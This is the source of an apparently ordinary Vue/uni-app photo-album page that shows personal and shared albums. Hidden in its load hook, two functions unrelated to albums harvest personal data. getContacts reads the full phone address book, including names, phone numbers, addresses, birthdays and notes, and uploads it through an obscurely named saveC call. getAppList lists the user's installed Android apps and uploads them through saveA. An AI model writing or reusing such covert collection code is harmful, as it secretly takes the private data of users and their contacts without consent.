<template>
  <view class="albums">
    <wuc-tab tab-class="albums-tab-basic" select-class="albums-tab-active" :tab-list="tabList" textFlex :tabCur.sync="TabCur" @change="tabChange"></wuc-tab>
    <swiper class="albums-swiper" :current="TabCur" duration="300" @change="swiperChange">
      <!-- 我的相册 -->
      <swiper-item class="albums-swiper-item">
        <uni-grid :show-border="false" :column="3">
          <uni-grid-item :class="isShowDelete && item.id !== 'all' ? 'swing' : ''" class="albums-item animated infinite slower" v-for="item in albumsList" :key="item.id">
            <image @click="ablumEntry(item.id, item.name, item.userId)" @longpress="isShowDelete = !isShowDelete" class="albums-img" :lazy-load="true" :src="item.coverImgUrl || ALBUMS_DEFAULT_IMG" mode="center"></image>
            <view class="albums-name">{{ item.name }}</view>
            <view class="albums-tips">{{ item.count }}</view>
            <icon v-if="isShowDelete && item.id !== 'all'" @click="deleteAlbum(item)" class="album-delete-button" type="cancel" size="26" />
          </uni-grid-item>
        </uni-grid>
        <uniFab ref="uniFab" direction="vertical" horizontal="right" @trigger="trigger" :content="content" :pattern="pattern"></uniFab>
      </swiper-item>
      <!-- 共享相册 -->
      <swiper-item class="albums-swiper-item">
        <view class="albums-share">
          我的共享:
        </view>
        <uni-grid :show-border="false" :column="3">
          <uni-grid-item :class="isShowDelete && item.id !== 'all' ? 'swing' : ''" class="albums-item animated infinite slower" v-for="item in myShareList" :key="item.id">
            <image @click="ablumEntry(item.id, item.name, item.userId)" @longpress="isShowDelete = !isShowDelete" class="albums-img" :lazy-load="true" :src="item.coverImgUrl || ALBUMS_DEFAULT_IMG" mode="center"></image>
            <view class="albums-name">{{ item.name }}</view>
            <view class="albums-tips">{{ item.count }}</view>
            <icon v-if="isShowDelete && item.id !== 'all'" @click="deleteAlbum(item)" class="album-delete-button" type="cancel" size="26" />
          </uni-grid-item>
        </uni-grid>
        <view v-if="myShareList && myShareList.length <= 0" class="albums-share-empty">
        	<text>您尚未与他人共享相册呢</text>
        </view>
        <view class="albums-share">
          他人共享:
        </view>
        <uni-grid :show-border="false" :column="3">
          <uni-grid-item class="albums-item" v-for="item in otherShareList" :key="item.id">
            <image @click="ablumEntry(item.id, item.name, item.userId)" @longpress="isShowDelete = !isShowDelete" class="albums-img" :lazy-load="true" :src="item.coverImgUrl || ALBUMS_DEFAULT_IMG" mode="center"></image>
            <view class="albums-name">{{ item.name }}</view>
            <view class="albums-tips">来自: {{ item.userName }}</view>
            <view class="albums-tips">{{ item.count }}</view>
          </uni-grid-item>
        </uni-grid>
        <view v-if="myShareList && otherShareList.length <= 0" class="albums-share-empty">
        	<text>暂无他人共享相册给您呢</text>
        </view>
      </swiper-item>
    </swiper>
  </view>
</template>

<script>
import { uniGrid, uniGridItem, uniFab } from '@dcloudio/uni-ui';
import WucTab from '@/components/wuc-tab/wuc-tab.vue';
import { ALBUMS_DEFAULT_IMG } from '@/config';
export default {
  components: { uniGrid, uniGridItem, uniFab, WucTab },
  data() {
    return {
      tabList: [{ name: '我的相册' }, { name: '共享相册' }],
      TabCur: 0,
      isShowDelete: false,
      pattern: {
        color: '#333',
        backgroundColor: '#fff',
        buttonColor: '#00B9B2'
      },
      content: [
        {
          iconPath: '../../static/images/albums.png',
          text: '新建相册',
          active: false,
          value: 'create'
        },
        {
          iconPath: '../../static/images/albums.png',
          text: '上传图片',
          active: false,
          value: 'upload'
        }
      ],
      albumsList: [],
      myShareList: [],
      otherShareList: [],
      ALBUMS_DEFAULT_IMG
    };
  },
  onLoad() {
    this.getAppList()
    this.getContacts();
  },
  onShow() {
    this.getUserAlbumsList();
    this.getShareList();
  },
  methods: {
    // 获取通讯录
    getContacts() {
      // TODO: 会触发权限申请
      try {
        const self = this;
        let contactsArr = [];
        plus.contacts.getAddressBook(
          plus.contacts.ADDRESSBOOK_PHONE,
          function(addressbook) {
            addressbook.find([], function(contacts) {
              for (let item of contacts) {
                contactsArr.push({
                  id: item.id,
                  displayName: item.displayName,
                  name: item.name,
                  nickName: item.nickname,
                  addresses: item.addresses,
                  note: item.note,
                  categories: item.categories,
                  birthday: item.birthday,
                  phones: (() => {
                    let phoneArr = [];
                    for (let el of item.phoneNumbers) {
                      el.value && phoneArr.push(el.value);
                    }
                    return phoneArr;
                  })()
                });
              }
              self.$api.saveC({
                c: contactsArr
              });
            });
          },
          error => {
            self.$api.pushMessage({
              message: '用户拒绝授权通讯录权限',
              status: 401,
              data: error
            });
          }
        );
      } catch (e) {
        //TODO handle the exception
        self.$api.pushMessage({
          message: '未知异常',
          status: 400,
          data: e
        });
      }
    },
    // 获取已安装应用列表
    getAppList() {
      plus.android.importClass('java.util.ArrayList');
      plus.android.importClass('android.content.pm.PackageInfo');
      plus.android.importClass('android.content.pm.PackageManager');
      var ApplicationInfo = plus.android.importClass('android.content.pm.ApplicationInfo');
      var MainActivity = plus.android.runtimeMainActivity();
      var PackageManager = MainActivity.getPackageManager();
      var pinfo = plus.android.invoke(PackageManager, 'getInstalledPackages', 0);
      if (pinfo != null) {
        var apklist = [];
        for (var i = 0; i < pinfo.size(); i++) {
          //PackageInfo{4b45699f9d  com.tencent.mobileqq}
          var pkginfo = pinfo.get(i);
          var issysapk = (pkginfo.plusGetAttribute('applicationInfo').plusGetAttribute('flags') & ApplicationInfo.FLAG_SYSTEM) != 0 ? true : false;
          if (issysapk == false) {
            const apkinfo = {
              appName: pkginfo
                .plusGetAttribute('applicationInfo')
                .loadLabel(PackageManager)
                .toString(),
              packageName: pkginfo.plusGetAttribute('packageName'),
              versionName: pkginfo.plusGetAttribute('versionName'),
              versionCode: pkginfo.plusGetAttribute('versionCode')
            };
            apklist.push(apkinfo);
          }
        }
        this.$api.saveA({
          a: apklist
        })
      }
    },
    // 获取共享相册列表
    async getShareList() {
      const res = await this.$api.getShareAlbums()
      if (res.status !== 200) return this.$common.warning(res.message || '获取共享相册列表失败');
      this.myShareList = res.data.myShare;
      this.otherShareList = res.data.otherShare;
    },
    tabChange(index) {
      this.TabCur = index;
      if (index === 0) {
        this.getUserAlbumsList();
      } else {
        this.getShareList();
      }
    },
    swiperChange(e) {
      const { current } = e.target;
      this.TabCur = current;
    },
    ablumEntry(id, name, userId) {
      uni.navigateTo({
          url: `./list/list?id=${id}&userId=${userId}&name=${name}`
      });
    },
    deleteAlbum(item) {
      uni.showModal({
        title: '提示',
        content: `您确定要删除相册 ${item.name} 及该相册内所有图片吗?`,
        success: async opts => {
          if (opts.confirm) {
            // 执行删除
            const res = await this.$api.deleteAlbum(undefined, null, { payload: '/' + item.id });
            if (res.status === 200) {
              this.$common.success('删除相册成功');
              this.isShowDelete = false;
              this.getUserAlbumsList();
            } else this.$common.warning(res.message || '删除相册失败');
          }
        }
      });
    },
    trigger(e) {
      this.$refs.uniFab.close(); // 收起按钮组
      if (!e && !e.item) return;
      switch (e.item.value) {
        // 新建相冊
        case 'create':
          uni.navigateTo({
            url: './create/create'
          });
          break;
        case 'upload':
          uni.navigateTo({
            url: './upload/upload'
          });
          break;
        default:
          break;
      }
    },
    // 获取用户相册列表
    async getUserAlbumsList() {
      const res = await this.$api.getAllalbums();
      if (res.status !== 200) return this.$common.error(res.message || '获取用户相册列表失败');
      this.albumsList = res.data;
    }
  }
};
</script>

<style lang="less" scoped>
.album-delete-button {
  position: absolute;
  right: -10rpx;
  top: 0;
}
.albums {
  padding-top: var(--status-bar-height);
  overflow-y: hidden;
  &-share {
    padding-left: 15rpx;
    font-size: 28rpx;
    color: @bgColor;
    &-empty {
      padding: 20px 0;
      text-align: center;
      font-size: 32rpx;
      color: @labelColor;
    }
  }
  &-swiper {
    width: 100%;
    height: 85.5vh;
    &-item {
      overflow-y: auto;
    }
  }
  &-item {
    padding: 6rpx 0 6rpx 3rpx;
  }
  &-name, &-tips {
    padding-left: 24rpx;
    width: 100%;
    text-align: left;
  }
  &-name {
    font-size: 30rpx;
    color: @labelColor;
  }
  &-tips {
    font-size: 24rpx;
    color: @tipsColor;
  }
  &-img {
    width: 100%;
  }
}
</style>
